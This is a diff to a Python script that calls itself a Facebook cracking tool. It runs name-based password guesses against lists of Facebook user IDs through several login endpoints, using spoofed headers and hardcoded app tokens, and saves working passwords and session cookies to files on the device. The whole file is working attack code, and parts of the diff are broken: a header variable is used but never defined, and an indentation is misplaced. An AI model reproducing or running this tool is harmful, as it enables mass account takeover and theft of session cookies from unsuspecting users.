@@ -330,7 +330,7 @@ logo=("""\033[1;37m
 \033[1;37m-----------------------------------------------
 \033[1;37m AUTHOR    : SHVNI\033[92;1m•
 \033[1;37m GITHUB    : SHVNI-404\033[92;1m
-\033[1;37m VERSION   : \033[92;1m5\033[92;1m.\033[92;1m0
+\033[1;37m VERSION   : \033[92;1m5\033[92;1m.\033[92;1m1
 \033[1;37m═══════════════════════════════════════════════
 \033[92;1m  HI SW WELCOME MY TOOLS
 \033[92;1m  FACEBOOK CRACKING TOOLS
@@ -443,7 +443,7 @@ def menu():
                                         total_ids = str(len(fo))
                                         
                                         print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
-                                        print("\033[1;37m CRACKING PLEASE WAIT....ON\033[1;37m")
+                                        print("\033[1;37m CRACKING PLEASE WAIT\033[1;37m")
                                         line()
                                         for user in fo:
                                                 ids,names = user.split('|')
@@ -684,7 +684,25 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(S1())
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+    'viewport-width': '980',
+}
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -699,8 +717,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Aws:
                                 if 'y' in pcp:
-                                        #print('\r\r\x1b[38;5;208m [SATAN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        #print('\r\r\x1b[38;5;208m [SHVNI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SHVNI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -721,87 +739,7 @@ def api1(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
-			if 'session_key' in po:
-				uid = str(po['uid'])
-				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
-				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-				cookies = f"sb={ssbb};{ckkk}"
-				#print('\033[1;37m [🍪] Cookies :- '+cookies)
-				open('/sdcard/SHVNI-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
-				oks.append(uid)
-				break
-			elif 'www.facebook.com' in po['error']['message']:
-				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		pass
-def rd(ids,passlist):
-	try:
-		global oks,loop
-                
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
-		for pas in passlist:                                          
-			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
-			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
-			if 'session_key' in po:
-				uid = str(po['uid'])                                  
-				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
-				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-				cookies = f"sb={ssbb};{ckkk}"
-				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
-				open('/sdcard/SATAN-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
-				oks.append(uid)
-                                
-				break
-			elif 'www.facebook.com' in po['error']['message']:                                
-				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-R-CP.txt','a').write(uid+'|'+pas+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		pass
-def bd1(ids,passlist):
-    global loop
-    global cps
-    global oks   
-    try:
-        for ps in passlist:            
-            session = requests.Session()
-            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
-            pro = random.choice(S1())            
-            free_fb = session.get('https://m.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+			header_freefb = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -820,6 +758,122 @@ def bd1(ids,passlist):
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
+			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])
+				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				#print('\033[1;37m [🍪] Cookies :- '+cookies)
+				open('/sdcard/SHVNI-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				oks.append(uid)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = str(po['error']['error_data']['uid'])
+				#print(f'\r\r\033[1;33m [SHVNI-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SHVNI-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def rd(ids,passlist):
+	try:
+		global oks,loop
+                
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		for pas in passlist:                                          
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
+header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+    'viewport-width': '980',
+}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = str(po['uid'])                                  
+				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
+				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+				cookies = f"sb={ssbb};{ckkk}"
+				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
+				open('/sdcard/SHVNI-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+				oks.append(uid)
+                                
+				break
+			elif 'www.facebook.com' in po['error']['message']:                                
+				uid = str(po['error']['error_data']['uid'])
+				#print(f'\r\r\033[1;33m [SHVNI-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/SHVNI-R-CP.txt','a').write(uid+'|'+pas+'\n')
+				cps.append(uid)
+				break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+def bd1(ids,passlist):
+    global loop
+    global cps
+    global oks   
+    try:
+        for ps in passlist:            
+            session = requests.Session()
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHVNI\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
+            pro = random.choice(S1())            
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"vivo Y83"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -828,17 +882,17 @@ def bd1(ids,passlist):
                 cid = coki[7:22]
                 print('\r\r\033[1;32m [SHVNI-OK] '+ids+' | '+ps)                
                 print('\033[1;37m [🍪] Cookies :- '+coki)                
-                open('/sdcard/SATAN-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                open('/sdcard/SHVNI-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print(f'\r\r\033[1;33m [SATAN-CP] '+ids+' | '+ps+'\033[1;97m')
-                open('/sdcard/SATAN-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                #print(f'\r\r\033[1;33m [SHVNI-CP] '+ids+' | '+ps+'\033[1;97m')
+                open('/sdcard/SHVNI-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
-                print('\033[1;93m\033[0;34mSATAN-2F '+ids+' • '+ps+'  \033[0;97m')
+                print('\033[1;93m\033[0;34mSHVNI-2F '+ids+' • '+ps+'  \033[0;97m')
                 break
             else:
                 continue
@@ -861,7 +915,25 @@ def newidx(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
+			header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+    'viewport-width': '980',
+}
 			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
 			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
